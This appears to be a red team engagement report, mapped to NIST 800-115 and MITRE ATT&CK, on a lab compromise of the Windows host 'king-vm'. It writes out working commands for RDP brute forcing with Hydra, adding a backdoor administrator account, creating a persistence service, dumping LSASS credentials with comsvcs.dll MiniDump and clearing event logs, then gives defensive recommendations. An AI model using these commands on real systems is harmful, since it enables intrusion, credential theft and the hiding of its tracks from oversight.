# Red Team Engagement 
***Referencing NIST 800-115***  

> **Disclaimer**: The following documentation highlights malicious tactics and techniques used **exclusively** for **authorized Red Team** or penetration-testing exercises in alignment with **NIST SP 800-115** (Technical Guide to Information Security Testing and Assessment). Any real-world, unauthorized execution of these steps is **illegal** and unethical.

---

## 1. Overview
During this simulated Red Team engagement, the adversary (operating from a **Kali Linux** machine) identified and brute-forced Remote Desktop Protocol (RDP) on **king-vm**, successfully compromising the **Administrator** account. Once inside, the attacker performed system **enumeration**, **credential dumping**, and **log tampering**. The provided screenshots depict:
- Network scanning and service enumeration from Kali  
- Successful brute force attempts against the Administrator account  
- RDP session establishment and subsequent malicious commands on the target

---

## 2. NIST 800-115 Alignment
NIST SP 800-115 outlines four phases for penetration testing:
1. **Planning**: Defining scope and objectives  
2. **Discovery**: Gathering information, identifying vulnerabilities  
3. **Attack**: Exploiting systems and escalating privileges  
4. **Reporting**: Documenting findings, TTPs, and recommendations  

All malicious activities below were part of a **controlled** Red Team test, following these phases.

---

## 3. Reconnaissance & Initial Access (Kali Machine)
### 3.1 Network Scanning
From the **Kali** host, the attacker scanned the target’s IP to discover open ports/services:
`nmap -p 3389 <TARGET_IP>`

- Found **RDP (3389)** open on **king-vm**.

### 3.2 RDP Brute Force
Using a password-guessing tool (**Hydra**) on Kali, the attacker ran repeated login attempts against the **Administrator** account:
`hydra -l Administrator -P /path/to/passwordlist.txt rdp://<TARGET_IP>`
- Eventually gained a **valid** password for the built-in **Administrator** user.  
- This is visible in the screenshots, showing successful brute force output.

### 3.3 Establishing RDP Session
With a **valid password** discovered, the adversary used an RDP client from Kali (or any remote RDP client) to log in:
`rdesktop <TARGET_IP> -u Administrator -p <DiscoveredPassword>`
- Successfully accessed the **king-vm** desktop.  
- The screenshots show the attacker’s remote desktop session from Kali.

---

## 4. Post-Exploitation Activities on king-vm
Once inside, the attacker performed several key actions.

### 4.1 System Enumeration
Commands executed:
```
whoami
hostname
winver
systeminfo
ipconfig /all
arp -a
```

Identified OS version, patch level, network configuration, and local user context (administrator).

### 4.2 Privilege Escalation & Persistence
Administrator Account Modification

```
net user administrator Plokijuhy
Attempt to change Administrator password.
Creating a New Local Admin
```

```
net user EvilAdmin P@ssw0rd /add
net localgroup administrators EvilAdmin /add
```

Gave **EvilAdmin** full administrative privileges.

Malicious Service Creation

```
sc create EvilService
```

Used to register a potentially malicious service in the registry for persistence or lateral movement.

#### Modified registry keys under `HKCU`

### 4.3 Credential Dumping
```
tasklist | findstr lsass
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\lsass.dmp full
```

Dumped LSASS process into `C:\lsass.dmp`, allowing offline credential extraction (NTLM hashes or clear-text passwords if available).

### 4.4 Log Tampering
```
wevtutil el
wevtutil cl "Application"
wevtutil cl "Windows PowerShell"
```

Attempted clearing event logs with wevtutil to cover tracks. Some operations returned “Access is denied”, but the intent was clear.

---

## 5 MITRE ATT&CK Techniques
**T1078 - Valid Accounts:** Gaining admin access via brute force.

**T1003 - Credential Dumping:** Dumped LSASS memory using rundll32 comsvcs.dll, MiniDump.

**T1136 - Create Account:** Created “EvilAdmin” for persistent access.

**T1543 - Create or Modify System Process:** Registered new service EvilService to maintain foothold.

**T1070.001 - Log Deletion:** Attempted to clear event logs via wevtutil.

---

## 6. Findings & Recommendations
Enforce Strong Access Controls

Use MFA for RDP logins.
Enforce lockout policies after multiple failed attempts.
Restrict RDP Exposure

Avoid public-facing RDP; use VPN or a secure jump host.
Segment networks so that RDP is only accessible where necessary.
Credential Protection

Enable LSASS protections (e.g., Credential Guard).
Regularly monitor for MiniDump or suspicious processes.
Enhanced Logging & Alerts

Alert on event log clearing attempts and new service creations.
Monitor for repeated login failures or brute force patterns.
Harden Built-in Admin Accounts

Rename or disable default Administrator if not strictly required.
Implement password rotation and store credentials in a secure vault.

---

### 7. Conclusion
From their Kali attack box, the Red Team scanned, brute-forced, and established RDP access to king-vm using the default Administrator account. Post-compromise, they performed reconnaissance, created new administrator accounts, dumped credentials from LSASS, and attempted to delete Windows event logs. This scenario illustrates how unsecured RDP endpoints can lead to devastating intrusions. Following NIST SP 800-115 guidelines, the organization can implement stricter remote access controls, better monitoring, and robust credential policies to mitigate similar threats in the future.
